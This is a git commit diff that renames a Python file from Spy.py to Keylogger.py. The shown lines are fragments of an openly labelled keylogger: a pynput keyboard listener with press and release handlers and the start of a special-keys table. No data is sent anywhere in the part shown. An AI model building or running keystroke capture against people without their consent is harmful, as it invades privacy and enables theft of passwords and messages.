aa0561cc24388e6576fb7f5808f2d82dd9482c8f
Hossein <hosseinsamivand1384@gmail.com>
2025-09-24 14:22:35 +0330

    Update and rename Spy.py to Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,4 +1,3 @@
-# --------------Keylogger------------------
 from pynput.keyboard import Listener, Key
 
 special_keys = {
@@ -68,3 +67,4 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
